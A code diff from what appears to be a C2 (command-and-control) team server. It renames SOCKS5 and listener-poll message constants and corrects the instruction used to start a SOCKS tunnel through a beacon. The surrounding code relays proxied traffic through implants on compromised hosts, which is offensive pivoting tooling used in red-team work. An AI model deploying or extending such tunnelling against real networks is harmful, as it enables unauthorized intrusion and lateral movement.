@@ -502,7 +502,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 
 	// Start socks beacon side
 	C2Message c2MessageStartSocks;
-	c2MessageStartSocks.set_instruction(SleepCmd);
+	c2MessageStartSocks.set_instruction(Socks5Cmd);
 	c2MessageStartSocks.set_cmd(StartCmd);
 	c2MessageStartSocks.set_pid(port);
 	socksListener->queueTask(beaconHash, c2MessageStartSocks);
@@ -531,7 +531,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 		C2Message c2Message = socksListener->getSocksTaskResult(beaconHash);
 
 		// if the beacon request stopSocks we end the server
-		if(c2Message.instruction() == Socks5 && c2Message.cmd() == "stopSocks")
+		if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "stopSocks")
 		{	
 			socksServer.stop();
 			isSocksServerRunning=false;
@@ -554,7 +554,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 					m_logger->info("Socks5 to {}:{}", std::to_string(ip), std::to_string(port));
 
 					C2Message c2MessageToSend;
-					c2MessageToSend.set_instruction(Socks5);
+					c2MessageToSend.set_instruction(Socks5Cmd);
 					c2MessageToSend.set_cmd("init");
 					c2MessageToSend.set_data(std::to_string(ip));
 					c2MessageToSend.set_args(std::to_string(port));
@@ -569,7 +569,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 				{
 					m_logger->info("Socks5 wait handshake {}", id);
 
-					if(c2Message.instruction() == Socks5 && c2Message.cmd() == "init" && c2Message.pid() == id)
+					if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "init" && c2Message.pid() == id)
 					{
 						m_logger->info("Socks5 handshake received {}", id);
 
@@ -594,7 +594,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 								socksServer.m_socksTunnelServers[i].reset(nullptr);
 
 								C2Message c2MessageToSend;
-								c2MessageToSend.set_instruction(Socks5);
+								c2MessageToSend.set_instruction(Socks5Cmd);
 								c2MessageToSend.set_cmd("stop");
 								c2MessageToSend.set_pid(id);
 
@@ -606,7 +606,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 								m_logger->info("Socks5 send data to beacon");
 
 								C2Message c2MessageToSend;
-								c2MessageToSend.set_instruction(Socks5);
+								c2MessageToSend.set_instruction(Socks5Cmd);
 								c2MessageToSend.set_cmd("run");
 								c2MessageToSend.set_pid(id);
 								c2MessageToSend.set_data(dataOut);
@@ -616,7 +616,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 							}
 						}
 					}
-					else if(c2Message.instruction() == Socks5 && c2Message.cmd() == "stop" && c2Message.pid() == id)
+					else if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "stop" && c2Message.pid() == id)
 					{
 						socksServer.m_socksTunnelServers[i].reset(nullptr);
 					}
@@ -626,7 +626,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 					m_logger->info("Socks5 run {}", id);
 
 					dataIn="";
-					if(c2Message.instruction() == Socks5 && c2Message.cmd() == "run" && c2Message.pid() == id)
+					if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "run" && c2Message.pid() == id)
 					{
 						m_logger->info("Socks5 {}: data received from beacon", id);
 
@@ -645,7 +645,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 							socksServer.m_socksTunnelServers[i].reset(nullptr);
 
 							C2Message c2MessageToSend;
-							c2MessageToSend.set_instruction(Socks5);
+							c2MessageToSend.set_instruction(Socks5Cmd);
 							c2MessageToSend.set_cmd("stop");
 							c2MessageToSend.set_pid(id);
 
@@ -657,7 +657,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 							m_logger->info("Socks5 send data to beacon");
 
 							C2Message c2MessageToSend;
-							c2MessageToSend.set_instruction(Socks5);
+							c2MessageToSend.set_instruction(Socks5Cmd);
 							c2MessageToSend.set_cmd("run");
 							c2MessageToSend.set_pid(id);
 							c2MessageToSend.set_data(dataOut);
@@ -666,7 +666,7 @@ void TeamServer::runSocksServer(int port, const std::string& listenerHash, const
 								socksListener->queueTask(beaconHash, c2MessageToSend);
 						}
 					}
-					else if(c2Message.instruction() == Socks5 && c2Message.cmd() == "stop" && c2Message.pid() == id)
+					else if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == "stop" && c2Message.pid() == id)
 					{
 						socksServer.m_socksTunnelServers[i].reset(nullptr);
 					}
@@ -719,7 +719,7 @@ grpc::Status TeamServer::SendCmdToSession(grpc::ServerContext* context, const te
 				}
 
 				// Start a thread that handle all the communication with the beacon
-				if(c2Message.instruction() == Socks5 && c2Message.cmd() == StartCmd)
+				if(c2Message.instruction() == Socks5Cmd && c2Message.cmd() == StartCmd)
 				{
 					if(m_isSocksServerRunning==true)
 					{
@@ -782,7 +782,7 @@ grpc::Status TeamServer::GetResponseFromSession(grpc::ServerContext* context, co
 						}
 					}
 
-					if(instruction==ListenerPolCmd)
+					if(instruction==ListenerPollCmd)
 					{
 						m_logger->debug("beaconHash {0}", beaconHash);
 						m_logger->debug("returnvalue {0}", c2Message.returnvalue());
